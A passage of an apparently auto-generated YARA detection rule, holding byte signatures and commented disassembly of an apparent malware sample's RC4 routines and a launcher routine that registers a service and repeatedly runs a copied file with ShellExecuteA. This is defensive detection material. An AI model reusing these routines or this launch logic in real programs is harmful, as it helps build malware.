        $c34 = { 51 56 57 8B 3D ?? ?? ?? ?? 8B F1 6A 00 FF D7 6A 00 66 C7 44 24 ?? 01 00 66 C7 44 24 ?? 00 00 FF D7 8B 8E ?? ?? ?? ?? 8D 44 24 ?? 6A 04 50 68 80 00 00 00 68 FF FF 00 00 51 FF 15 ?? ?? ?? ?? 6A 00 FF D7 8B 96 ?? ?? ?? ?? 52 FF 15 ?? ?? ?? ?? 6A 00 FF D7 8D 86 ?? ?? ?? ?? 6A 00 50 FF 15 ?? ?? ?? ?? 6A 00 FF D7 8B 8E ?? ?? ?? ?? 51 FF 15 ?? ?? ?? ?? 6A 00 FF D7 8B 96 ?? ?? ?? ?? 52 FF 15 ?? ?? ?? ?? 6A 00 FF D7 C7 86 ?? ?? ?? ?? FF FF FF FF 5F 5E 59 C3 }
        /*
function at 0x00404950@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - encrypt data using RC4 KSA
        .text:0x00404950  
        .text:0x00404950  FUNC: int stdcall sub_00404950( int arg0, int arg1, int arg2, ) [4 XREFS] 
        .text:0x00404950  
        .text:0x00404950  Stack Variables: (offset from initial top of stack)
        .text:0x00404950            12: int arg2
        .text:0x00404950             8: int arg1
        .text:0x00404950             4: int arg0
        .text:0x00404950          -1020: int local1020
        .text:0x00404950          -1024: int local1024
        .text:0x00404950  
        .text:0x00404950  81ec00040000     sub esp,1024
        .text:0x00404956  53               push ebx
        .text:0x00404957  55               push ebp
        .text:0x00404958  56               push esi
        .text:0x00404959  57               push edi
        .text:0x0040495a  33db             xor ebx,ebx
        .text:0x0040495c  33f6             xor esi,esi
        .text:0x0040495e  b9ff000000       mov ecx,255
        .text:0x00404963  33c0             xor eax,eax
        .text:0x00404965  8d7c2414         lea edi,dword [esp + 20]
        .text:0x00404969  895c2410         mov dword [esp + 16],ebx
        .text:0x0040496d  f3ab             rep: stosd 
        .text:0x0040496f  8b8c2414040000   mov ecx,dword [esp + 1044]
        .text:0x00404976  8d7c2410         lea edi,dword [esp + 16]
        .text:0x0040497a  loc_0040497a: [1 XREFS]
        .text:0x0040497a  8bc3             mov eax,ebx
        .text:0x0040497c  33d2             xor edx,edx
        .text:0x0040497e  f7b4241c040000   div dword [esp + 1052]
        .text:0x00404985  8bac2418040000   mov ebp,dword [esp + 1048]
        .text:0x0040498c  33c0             xor eax,eax
        .text:0x0040498e  881c0b           mov byte [ebx + ecx],bl
        .text:0x00404991  43               inc ebx
        .text:0x00404992  83c704           add edi,4
        .text:0x00404995  81fb00010000     cmp ebx,256
        .text:0x0040499b  8a042a           mov al,byte [edx + ebp]
        .text:0x0040499e  8947fc           mov dword [edi - 4],eax
        .text:0x004049a1  7cd7             jl 0x0040497a
        .text:0x004049a3  33c0             xor eax,eax
        .text:0x004049a5  8d7c2410         lea edi,dword [esp + 16]
        .text:0x004049a9  loc_004049a9: [1 XREFS]
        .text:0x004049a9  8a1408           mov dl,byte [eax + ecx]
        .text:0x004049ac  8b2f             mov ebp,dword [edi]
        .text:0x004049ae  8bda             mov ebx,edx
        .text:0x004049b0  81e3ff000000     and ebx,255
        .text:0x004049b6  03dd             add ebx,ebp
        .text:0x004049b8  03f3             add esi,ebx
        .text:0x004049ba  81e6ff000080     and esi,0x800000ff
        .text:0x004049c0  7908             jns 0x004049ca
        .text:0x004049c2  4e               dec esi
        .text:0x004049c3  81ce00ffffff     or esi,0xffffff00
        .text:0x004049c9  46               inc esi
        .text:0x004049ca  loc_004049ca: [1 XREFS]
        .text:0x004049ca  8a1c0e           mov bl,byte [esi + ecx]
        .text:0x004049cd  83c704           add edi,4
        .text:0x004049d0  881c08           mov byte [eax + ecx],bl
        .text:0x004049d3  40               inc eax
        .text:0x004049d4  3d00010000       cmp eax,256
        .text:0x004049d9  88140e           mov byte [esi + ecx],dl
        .text:0x004049dc  7ccb             jl 0x004049a9
        .text:0x004049de  5f               pop edi
        .text:0x004049df  5e               pop esi
        .text:0x004049e0  5d               pop ebp
        .text:0x004049e1  5b               pop ebx
        .text:0x004049e2  81c400040000     add esp,1024
        .text:0x004049e8  c20c00           ret 12
        */
        $c35 = { 81 EC 00 04 00 00 53 55 56 57 33 DB 33 F6 B9 FF 00 00 00 33 C0 8D 7C 24 ?? 89 5C 24 ?? F3 AB 8B 8C 24 ?? ?? ?? ?? 8D 7C 24 ?? 8B C3 33 D2 F7 B4 24 ?? ?? ?? ?? 8B AC 24 ?? ?? ?? ?? 33 C0 88 1C 0B 43 83 C7 04 81 FB 00 01 00 00 8A 04 2A 89 47 ?? 7C ?? 33 C0 8D 7C 24 ?? 8A 14 08 8B 2F 8B DA 81 E3 FF 00 00 00 03 DD 03 F3 81 E6 FF 00 00 80 79 ?? 4E 81 CE 00 FF FF FF 46 8A 1C 0E 83 C7 04 88 1C 08 40 3D 00 01 00 00 88 14 0E 7C ?? 5F 5E 5D 5B 81 C4 00 04 00 00 C2 0C 00 }
        /*
function at 0x004049f0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - encrypt data using RC4 PRGA
        .text:0x004049f0  
        .text:0x004049f0  FUNC: int stdcall sub_004049f0( int arg0, int arg1, int arg2, ) [8 XREFS] 
        .text:0x004049f0  
        .text:0x004049f0  Stack Variables: (offset from initial top of stack)
        .text:0x004049f0            12: int arg2
        .text:0x004049f0             8: int arg1
        .text:0x004049f0             4: int arg0
        .text:0x004049f0  
        .text:0x004049f0  8b44240c         mov eax,dword [esp + 12]
        .text:0x004049f4  56               push esi
        .text:0x004049f5  57               push edi
        .text:0x004049f6  33c9             xor ecx,ecx
        .text:0x004049f8  33f6             xor esi,esi
        .text:0x004049fa  33ff             xor edi,edi
        .text:0x004049fc  85c0             test eax,eax
        .text:0x004049fe  767c             jbe 0x00404a7c
        .text:0x00404a00  8b44240c         mov eax,dword [esp + 12]
        .text:0x00404a04  53               push ebx
        .text:0x00404a05  55               push ebp
        .text:0x00404a06  8b6c2418         mov ebp,dword [esp + 24]
        .text:0x00404a0a  loc_00404a0a: [1 XREFS]
        .text:0x00404a0a  41               inc ecx
        .text:0x00404a0b  81e1ff000080     and ecx,0x800000ff
        .text:0x00404a11  7908             jns 0x00404a1b
        .text:0x00404a13  49               dec ecx
        .text:0x00404a14  81c900ffffff     or ecx,0xffffff00
        .text:0x00404a1a  41               inc ecx
        .text:0x00404a1b  loc_00404a1b: [1 XREFS]
        .text:0x00404a1b  8a1401           mov dl,byte [ecx + eax]
        .text:0x00404a1e  8bda             mov ebx,edx
        .text:0x00404a20  81e3ff000000     and ebx,255
        .text:0x00404a26  03f3             add esi,ebx
        .text:0x00404a28  81e6ff000080     and esi,0x800000ff
        .text:0x00404a2e  7908             jns 0x00404a38
        .text:0x00404a30  4e               dec esi
        .text:0x00404a31  81ce00ffffff     or esi,0xffffff00
        .text:0x00404a37  46               inc esi
        .text:0x00404a38  loc_00404a38: [1 XREFS]
        .text:0x00404a38  8a1c06           mov bl,byte [esi + eax]
        .text:0x00404a3b  88542418         mov byte [esp + 24],dl
        .text:0x00404a3f  881c01           mov byte [ecx + eax],bl
        .text:0x00404a42  8b5c2418         mov ebx,dword [esp + 24]
        .text:0x00404a46  881406           mov byte [esi + eax],dl
        .text:0x00404a49  33d2             xor edx,edx
        .text:0x00404a4b  8a1401           mov dl,byte [ecx + eax]
        .text:0x00404a4e  81e3ff000000     and ebx,255
        .text:0x00404a54  03d3             add edx,ebx
        .text:0x00404a56  81e2ff000080     and edx,0x800000ff
        .text:0x00404a5c  7908             jns 0x00404a66
        .text:0x00404a5e  4a               dec edx
        .text:0x00404a5f  81ca00ffffff     or edx,0xffffff00
        .text:0x00404a65  42               inc edx
        .text:0x00404a66  loc_00404a66: [1 XREFS]
        .text:0x00404a66  8a1402           mov dl,byte [edx + eax]
        .text:0x00404a69  8a1c2f           mov bl,byte [edi + ebp]
        .text:0x00404a6c  32da             xor bl,dl
        .text:0x00404a6e  8b54241c         mov edx,dword [esp + 28]
        .text:0x00404a72  881c2f           mov byte [edi + ebp],bl
        .text:0x00404a75  47               inc edi
        .text:0x00404a76  3bfa             cmp edi,edx
        .text:0x00404a78  7290             jc 0x00404a0a
        .text:0x00404a7a  5d               pop ebp
        .text:0x00404a7b  5b               pop ebx
        .text:0x00404a7c  loc_00404a7c: [1 XREFS]
        .text:0x00404a7c  5f               pop edi
        .text:0x00404a7d  5e               pop esi
        .text:0x00404a7e  c20c00           ret 12
        */
        $c36 = { 8B 44 24 ?? 56 57 33 C9 33 F6 33 FF 85 C0 76 ?? 8B 44 24 ?? 53 55 8B 6C 24 ?? 41 81 E1 FF 00 00 80 79 ?? 49 81 C9 00 FF FF FF 41 8A 14 01 8B DA 81 E3 FF 00 00 00 03 F3 81 E6 FF 00 00 80 79 ?? 4E 81 CE 00 FF FF FF 46 8A 1C 06 88 54 24 ?? 88 1C 01 8B 5C 24 ?? 88 14 06 33 D2 8A 14 01 81 E3 FF 00 00 00 03 D3 81 E2 FF 00 00 80 79 ?? 4A 81 CA 00 FF FF FF 42 8A 14 02 8A 1C 2F 32 DA 8B 54 24 ?? 88 1C 2F 47 3B FA 72 ?? 5D 5B 5F 5E C2 0C 00 }
        /*
function at 0x00406f60@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - query environment variable
        .text:0x00406f60  
        .text:0x00406f60  FUNC: int stdcall sub_00406f60( int arg0, int arg1, int arg2, int arg3, ) [2 XREFS] 
        .text:0x00406f60  
        .text:0x00406f60  Stack Variables: (offset from initial top of stack)
        .text:0x00406f60            16: int arg3
        .text:0x00406f60            12: int arg2
        .text:0x00406f60             8: int arg1
        .text:0x00406f60             4: int arg0
        .text:0x00406f60            -7: int local7
        .text:0x00406f60            -8: int local8
        .text:0x00406f60            -9: int local9
        .text:0x00406f60           -10: int local10
        .text:0x00406f60           -11: int local11
        .text:0x00406f60           -12: int local12
        .text:0x00406f60           -14: int local14
        .text:0x00406f60           -15: int local15
        .text:0x00406f60           -16: int local16
        .text:0x00406f60           -20: int local20
        .text:0x00406f60           -21: int local21
        .text:0x00406f60           -22: int local22
        .text:0x00406f60           -23: int local23
        .text:0x00406f60           -24: int local24
        .text:0x00406f60           -25: int local25
        .text:0x00406f60           -26: int local26
        .text:0x00406f60           -27: int local27
        .text:0x00406f60           -28: int local28
        .text:0x00406f60           -29: int local29
        .text:0x00406f60           -30: int local30
        .text:0x00406f60           -31: int local31
        .text:0x00406f60           -32: int local32
        .text:0x00406f60           -36: int local36
        .text:0x00406f60           -37: int local37
        .text:0x00406f60           -38: int local38
        .text:0x00406f60           -39: int local39
        .text:0x00406f60           -40: int local40
        .text:0x00406f60           -43: int local43
        .text:0x00406f60           -44: int local44
        .text:0x00406f60           -45: int local45
        .text:0x00406f60           -46: int local46
        .text:0x00406f60           -47: int local47
        .text:0x00406f60           -48: int local48
        .text:0x00406f60           -76: int local76
        .text:0x00406f60          -335: int local335
        .text:0x00406f60          -336: int local336
        .text:0x00406f60          -595: int local595
        .text:0x00406f60          -596: int local596
        .text:0x00406f60          -855: int local855
        .text:0x00406f60          -856: int local856
        .text:0x00406f60          -1879: int local1879
        .text:0x00406f60          -1880: int local1880
        .text:0x00406f60  
        .text:0x00406f60  55               push ebp
        .text:0x00406f61  8bec             mov ebp,esp
        .text:0x00406f63  81ec54070000     sub esp,1876
        .text:0x00406f69  53               push ebx
        .text:0x00406f6a  56               push esi
        .text:0x00406f6b  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00406f71  33db             xor ebx,ebx
        .text:0x00406f73  57               push edi
        .text:0x00406f74  53               push ebx
        .text:0x00406f75  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406f77  53               push ebx
        .text:0x00406f78  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406f7a  90               nop 
        .text:0x00406f7b  90               nop 
        .text:0x00406f7c  90               nop 
        .text:0x00406f7d  90               nop 
        .text:0x00406f7e  90               nop 
        .text:0x00406f7f  90               nop 
        .text:0x00406f80  90               nop 
        .text:0x00406f81  90               nop 
        .text:0x00406f82  90               nop 
        .text:0x00406f83  53               push ebx
        .text:0x00406f84  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406f86  90               nop 
        .text:0x00406f87  53               push ebx
        .text:0x00406f88  53               push ebx
        .text:0x00406f89  53               push ebx
        .text:0x00406f8a  ff1514914000     call dword [0x00409114]    ;kernel32.GetCurrentThreadId()
        .text:0x00406f90  50               push eax
        .text:0x00406f91  ff15c8914000     call dword [0x004091c8]    ;user32.PostThreadMessageA(kernel32.GetCurrentThreadId(),0,0,0)
        .text:0x00406f97  53               push ebx
        .text:0x00406f98  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406f9a  90               nop 
        .text:0x00406f9b  ff15cc914000     call dword [0x004091cc]    ;user32.GetInputState()
        .text:0x00406fa1  53               push ebx
        .text:0x00406fa2  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406fa4  90               nop 
        .text:0x00406fa5  53               push ebx
        .text:0x00406fa6  53               push ebx
        .text:0x00406fa7  8d45b8           lea eax,dword [ebp - 72]
        .text:0x00406faa  53               push ebx
        .text:0x00406fab  50               push eax
        .text:0x00406fac  ff15d0914000     call dword [0x004091d0]    ;user32.GetMessageA(local76,0,0,0)
        .text:0x00406fb2  53               push ebx
        .text:0x00406fb3  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406fb5  90               nop 
        .text:0x00406fb6  b9ff000000       mov ecx,255
        .text:0x00406fbb  33c0             xor eax,eax
        .text:0x00406fbd  8dbdadf8ffff     lea edi,dword [ebp - 1875]
        .text:0x00406fc3  889dacf8ffff     mov byte [ebp - 1876],bl
        .text:0x00406fc9  f3ab             rep: stosd 
        .text:0x00406fcb  66ab             stosd 
        .text:0x00406fcd  6854030000       push 852
        .text:0x00406fd2  6818a24000       push 0x0040a218
        .text:0x00406fd7  aa               stosb 
        .text:0x00406fd8  e8b3fcffff       call 0x00406c90    ;sub_00406c90(0x0040a218,852)
        .text:0x00406fdd  689a010000       push 410
        .text:0x00406fe2  6878a04000       push 0x0040a078
        .text:0x00406fe7  e8a4fcffff       call 0x00406c90    ;sub_00406c90(0x0040a078,410)
        .text:0x00406fec  6a01             push 1
        .text:0x00406fee  e8bdf8ffff       call 0x004068b0    ;sub_004068b0(1)
        .text:0x00406ff3  83c414           add esp,20
        .text:0x00406ff6  85c0             test eax,eax
        .text:0x00406ff8  7420             jz 0x0040701a
        .text:0x00406ffa  53               push ebx
        .text:0x00406ffb  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406ffd  90               nop 
        .text:0x00406ffe  391d5ca54000     cmp dword [0x0040a55c],ebx
        .text:0x00407004  7405             jz 0x0040700b
        .text:0x00407006  e815e9ffff       call 0x00405920    ;sub_00405920()
        .text:0x0040700b  loc_0040700b: [1 XREFS]
        .text:0x0040700b  53               push ebx
        .text:0x0040700c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040700e  90               nop 
        .text:0x0040700f  5f               pop edi
        .text:0x00407010  5e               pop esi
        .text:0x00407011  33c0             xor eax,eax
        .text:0x00407013  5b               pop ebx
        .text:0x00407014  8be5             mov esp,ebp
        .text:0x00407016  5d               pop ebp
        .text:0x00407017  c21000           ret 16
        .text:0x0040701a  loc_0040701a: [1 XREFS]
        .text:0x0040701a  b940000000       mov ecx,64
        .text:0x0040701f  33c0             xor eax,eax
        .text:0x00407021  8dbdb5feffff     lea edi,dword [ebp - 331]
        .text:0x00407027  c685b4feffff00   mov byte [ebp - 332],0
        .text:0x0040702e  f3ab             rep: stosd 
        .text:0x00407030  66ab             stosd 
        .text:0x00407032  53               push ebx
        .text:0x00407033  aa               stosb 
        .text:0x00407034  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407036  8d8db4feffff     lea ecx,dword [ebp - 332]
        .text:0x0040703c  6804010000       push 260
        .text:0x00407041  51               push ecx
        .text:0x00407042  68fca34000       push 0x0040a3fc
        .text:0x00407047  ff1534914000     call dword [0x00409134]    ;kernel32.ExpandEnvironmentStringsA(0x0040a3fc,local336,260)
        .text:0x0040704d  53               push ebx
        .text:0x0040704e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407050  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00407056  8d95b4feffff     lea edx,dword [ebp - 332]
        .text:0x0040705c  52               push edx
        .text:0x0040705d  68fca34000       push 0x0040a3fc
        .text:0x00407062  e809d7ffff       call 0x00404770    ;sub_00404770(0x0040a3fc,local336)
        .text:0x00407067  53               push ebx
        .text:0x00407068  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040706a  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00407070  68fca34000       push 0x0040a3fc
        .text:0x00407075  e876d6ffff       call 0x004046f0    ;sub_004046f0(0x0040a3fc)
        .text:0x0040707a  80b8fba340005c   cmp byte [eax + 0x0040a3fb],92
        .text:0x00407081  7517             jnz 0x0040709a
        .text:0x00407083  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00407089  68fca34000       push 0x0040a3fc
        .text:0x0040708e  e85dd6ffff       call 0x004046f0    ;sub_004046f0(0x0040a3fc)
        .text:0x00407093  c680fba3400000   mov byte [eax + 0x0040a3fb],0
        .text:0x0040709a  loc_0040709a: [1 XREFS]
        .text:0x0040709a  53               push ebx
        .text:0x0040709b  c645f825         mov byte [ebp - 8],37
        .text:0x0040709f  c645f973         mov byte [ebp - 7],115
        .text:0x004070a3  c645fa5c         mov byte [ebp - 6],92
        .text:0x004070a7  c645fb25         mov byte [ebp - 5],37
        .text:0x004070ab  c645fc73         mov byte [ebp - 4],115
        .text:0x004070af  c645fd00         mov byte [ebp - 3],0
        .text:0x004070b3  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004070b5  6860a44000       push 0x0040a460
        .text:0x004070ba  8d45f8           lea eax,dword [ebp - 8]
        .text:0x004070bd  68fca34000       push 0x0040a3fc
        .text:0x004070c2  50               push eax
        .text:0x004070c3  68d8aa4000       push 0x0040aad8
        .text:0x004070c8  e8f30d0000       call 0x00407ec0    ;msvcrt.sprintf(0x0040aad8,local12)
        .text:0x004070cd  83c410           add esp,16
        .text:0x004070d0  53               push ebx
        .text:0x004070d1  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004070d3  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004070d9  68e0a04000       push 0x0040a0e0
        .text:0x004070de  6834ac4000       push 0x0040ac34
        .text:0x004070e3  e888d6ffff       call 0x00404770    ;sub_00404770(0x0040ac34,0x0040a0e0)
        .text:0x004070e8  53               push ebx
        .text:0x004070e9  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004070eb  391d68a54000     cmp dword [0x0040a568],ebx
        .text:0x004070f1  7405             jz 0x004070f8
        .text:0x004070f3  e8b8fcffff       call 0x00406db0    ;sub_00406db0()
        .text:0x004070f8  loc_004070f8: [1 XREFS]
        .text:0x004070f8  a060a54000       mov al,byte [0x0040a560]
        .text:0x004070fd  84c0             test al,al
        .text:0x004070ff  0f840a020000     jz 0x0040730f
        .text:0x00407105  b940000000       mov ecx,64
        .text:0x0040710a  33c0             xor eax,eax
        .text:0x0040710c  8dbdadfcffff     lea edi,dword [ebp - 851]
        .text:0x00407112  c685acfcffff00   mov byte [ebp - 852],0
        .text:0x00407119  f3ab             rep: stosd 
        .text:0x0040711b  66ab             stosd 
        .text:0x0040711d  53               push ebx
        .text:0x0040711e  aa               stosb 
        .text:0x0040711f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407121  8d8dacfcffff     lea ecx,dword [ebp - 852]
        .text:0x00407127  6804010000       push 260
        .text:0x0040712c  51               push ecx
        .text:0x0040712d  53               push ebx
        .text:0x0040712e  ff1538914000     call dword [0x00409138]    ;kernel32.GetModuleFileNameA(0,local856,260)
        .text:0x00407134  53               push ebx
        .text:0x00407135  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407137  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x0040713d  8d95acfcffff     lea edx,dword [ebp - 852]
        .text:0x00407143  68d8aa4000       push 0x0040aad8
        .text:0x00407148  52               push edx
        .text:0x00407149  e8b2d6ffff       call 0x00404800    ;sub_00404800(0,local856,0x0040aad8)
        .text:0x0040714e  85c0             test eax,eax
        .text:0x00407150  757e             jnz 0x004071d0
        .text:0x00407152  a060a54000       mov al,byte [0x0040a560]
        .text:0x00407157  66c70510ac400003 mov word [0x0040ac10],3
        .text:0x00407160  3c02             cmp al,2
        .text:0x00407162  755c             jnz 0x004071c0
        .text:0x00407164  53               push ebx
        .text:0x00407165  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407167  53               push ebx
        .text:0x00407168  c745e418a24000   mov dword [ebp - 28],0x0040a218
        .text:0x0040716f  c745e8a06d4000   mov dword [ebp - 24],0x00406da0
        .text:0x00407176  895dec           mov dword [ebp - 20],ebx
        .text:0x00407179  895df0           mov dword [ebp - 16],ebx
        .text:0x0040717c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040717e  53               push ebx
        .text:0x0040717f  66c70510ac400001 mov word [0x0040ac10],1
        .text:0x00407188  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040718a  90               nop 
        .text:0x0040718b  68f4010000       push 500
        .text:0x00407190  ffd6             call esi    ;kernel32.Sleep(500)
        .text:0x00407192  53               push ebx
        .text:0x00407193  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407195  8b3d24904000     mov edi,dword [0x00409024]
        .text:0x0040719b  8d45e4           lea eax,dword [ebp - 28]
        .text:0x0040719e  50               push eax
        .text:0x0040719f  ffd7             call edi    ;advapi32.StartServiceCtrlDispatcherA(local32)
        .text:0x004071a1  53               push ebx
        .text:0x004071a2  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004071a4  68e8030000       push 1000
        .text:0x004071a9  ffd6             call esi    ;kernel32.Sleep(1000)
        .text:0x004071ab  53               push ebx
        .text:0x004071ac  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004071ae  8d4de4           lea ecx,dword [ebp - 28]
        .text:0x004071b1  51               push ecx
        .text:0x004071b2  ffd7             call edi    ;advapi32.StartServiceCtrlDispatcherA(local32)
        .text:0x004071b4  53               push ebx
        .text:0x004071b5  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004071b7  66c70510ac400002 mov word [0x0040ac10],2
        .text:0x004071c0  loc_004071c0: [1 XREFS]
        .text:0x004071c0  e8abfbffff       call 0x00406d70    ;sub_00406d70(0,local856)
        .text:0x004071c5  5f               pop edi
        .text:0x004071c6  5e               pop esi
        .text:0x004071c7  33c0             xor eax,eax
        .text:0x004071c9  5b               pop ebx
        .text:0x004071ca  8be5             mov esp,ebp
        .text:0x004071cc  5d               pop ebp
        .text:0x004071cd  c21000           ret 16
        .text:0x004071d0  loc_004071d0: [1 XREFS]
        .text:0x004071d0  6a00             push 0
        .text:0x004071d2  895df4           mov dword [ebp - 12],ebx
        .text:0x004071d5  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004071d7  b940000000       mov ecx,64
        .text:0x004071dc  33c0             xor eax,eax
        .text:0x004071de  8dbdb1fdffff     lea edi,dword [ebp - 591]
        .text:0x004071e4  c685b0fdffff00   mov byte [ebp - 592],0
        .text:0x004071eb  f3ab             rep: stosd 
        .text:0x004071ed  66ab             stosd 
        .text:0x004071ef  6a00             push 0
        .text:0x004071f1  c645d425         mov byte [ebp - 44],37
        .text:0x004071f5  c645d573         mov byte [ebp - 43],115
        .text:0x004071f9  c645d65c         mov byte [ebp - 42],92
        .text:0x004071fd  c645d725         mov byte [ebp - 41],37
        .text:0x00407201  c645d873         mov byte [ebp - 40],115
        .text:0x00407205  c645d900         mov byte [ebp - 39],0
        .text:0x00407209  aa               stosb 
        .text:0x0040720a  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040720c  6860a44000       push 0x0040a460
        .text:0x00407211  8d55d4           lea edx,dword [ebp - 44]
        .text:0x00407214  68fca34000       push 0x0040a3fc
        .text:0x00407219  8d85b0fdffff     lea eax,dword [ebp - 592]
        .text:0x0040721f  52               push edx
        .text:0x00407220  50               push eax
        .text:0x00407221  e89a0c0000       call 0x00407ec0    ;msvcrt.sprintf(local596,local48)
        .text:0x00407226  6892a44000       push 0x0040a492
        .text:0x0040722b  6818a24000       push 0x0040a218
        .text:0x00407230  e8ebc2ffff       call 0x00403520    ;sub_00403520(msvcrt.sprintf(local596,local48),local48,64,0x0040a218,0x0040a492)
        .text:0x00407235  6818a24000       push 0x0040a218
        .text:0x0040723a  e811f4ffff       call 0x00406650    ;sub_00406650(0x0040a218)
        .text:0x0040723f  83c41c           add esp,28
        .text:0x00407242  6a00             push 0
        .text:0x00407244  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407246  68fca24000       push 0x0040a2fc
        .text:0x0040724b  687ca24000       push 0x0040a27c
        .text:0x00407250  8d8db0fdffff     lea ecx,dword [ebp - 592]
        .text:0x00407256  6818a24000       push 0x0040a218
        .text:0x0040725b  51               push ecx
        .text:0x0040725c  e88f010000       call 0x004073f0    ;sub_004073f0(local596,0x0040a218,0x0040a27c,0x0040a2fc)
        .text:0x00407261  8b3dac914000     mov edi,dword [0x004091ac]
        .text:0x00407267  83c410           add esp,16
        .text:0x0040726a  loc_0040726a: [2 XREFS]
        .text:0x0040726a  6a00             push 0
        .text:0x0040726c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040726e  6860a44000       push 0x0040a460
        .text:0x00407273  e8f8060000       call 0x00407970    ;sub_00407970(0x0040a460)
        .text:0x00407278  83c404           add esp,4
        .text:0x0040727b  85c0             test eax,eax
        .text:0x0040727d  754e             jnz 0x004072cd
        .text:0x0040727f  8b45f4           mov eax,dword [ebp - 12]
        .text:0x00407282  40               inc eax
        .text:0x00407283  3db80b0000       cmp eax,3000
        .text:0x00407288  8945f4           mov dword [ebp - 12],eax
        .text:0x0040728b  72dd             jc 0x0040726a
        .text:0x0040728d  6a00             push 0
        .text:0x0040728f  c745f400000000   mov dword [ebp - 12],0
        .text:0x00407296  c645dc6f         mov byte [ebp - 36],111
        .text:0x0040729a  c645dd70         mov byte [ebp - 35],112
        .text:0x0040729e  c645de65         mov byte [ebp - 34],101
        .text:0x004072a2  c645df6e         mov byte [ebp - 33],110
        .text:0x004072a6  c645e000         mov byte [ebp - 32],0
        .text:0x004072aa  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004072ac  6a05             push 5
        .text:0x004072ae  6a00             push 0
        .text:0x004072b0  8d95b0fdffff     lea edx,dword [ebp - 592]
        .text:0x004072b6  6a00             push 0
        .text:0x004072b8  8d45dc           lea eax,dword [ebp - 36]
        .text:0x004072bb  52               push edx
        .text:0x004072bc  50               push eax
        .text:0x004072bd  6a00             push 0
        .text:0x004072bf  ffd7             call edi    ;shell32.ShellExecuteA(0,local40,local596,0,0,5)
        .text:0x004072c1  6a00             push 0
        .text:0x004072c3  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004072c5  43               inc ebx
        .text:0x004072c6  83fb03           cmp ebx,3
        .text:0x004072c9  7335             jnc 0x00407300
        .text:0x004072cb  eb9d             jmp 0x0040726a
        .text:0x004072cd  loc_004072cd: [1 XREFS]
        .text:0x004072cd  6a00             push 0
        .text:0x004072cf  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004072d1  803d60a5400001   cmp byte [0x0040a560],1
        .text:0x004072d8  7514             jnz 0x004072ee
        .text:0x004072da  8d8db0fdffff     lea ecx,dword [ebp - 592]
        .text:0x004072e0  51               push ecx
        .text:0x004072e1  6818a24000       push 0x0040a218
        .text:0x004072e6  e8f5e3ffff       call 0x004056e0    ;sub_004056e0(0x0040a218,local596)
        .text:0x004072eb  83c408           add esp,8
        .text:0x004072ee  loc_004072ee: [1 XREFS]
        .text:0x004072ee  6a00             push 0
        .text:0x004072f0  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004072f2  a15ca54000       mov eax,dword [0x0040a55c]
        .text:0x004072f7  85c0             test eax,eax
        .text:0x004072f9  7405             jz 0x00407300
        .text:0x004072fb  e820e6ffff       call 0x00405920    ;sub_00405920()
        .text:0x00407300  loc_00407300: [2 XREFS]
        .text:0x00407300  6a00             push 0
        .text:0x00407302  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407304  5f               pop edi
        .text:0x00407305  5e               pop esi
        .text:0x00407306  33c0             xor eax,eax
        .text:0x00407308  5b               pop ebx
        .text:0x00407309  8be5             mov esp,ebp
        .text:0x0040730b  5d               pop ebp
        .text:0x0040730c  c21000           ret 16
        .text:0x0040730f  loc_0040730f: [1 XREFS]
        .text:0x0040730f  53               push ebx
        .text:0x00407310  c645f425         mov byte [ebp - 12],37
        .text:0x00407314  c645f573         mov byte [ebp - 11],115
        .text:0x00407318  c645f600         mov byte [ebp - 10],0
        .text:0x0040731c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040731e  8d55f4           lea edx,dword [ebp - 12]
        .text:0x00407321  6818a24000       push 0x0040a218
        .text:0x00407326  52               push edx
        .text:0x00407327  6818a24000       push 0x0040a218
        .text:0x0040732c  e88f0b0000       call 0x00407ec0    ;msvcrt.sprintf(0x0040a218,local16)
        .text:0x00407331  83c40c           add esp,12
        .text:0x00407334  53               push ebx
        .text:0x00407335  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407337  53               push ebx
        .text:0x00407338  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040733a  53               push ebx
        .text:0x0040733b  c645e443         mov byte [ebp - 28],67
        .text:0x0040733f  c645e56f         mov byte [ebp - 27],111
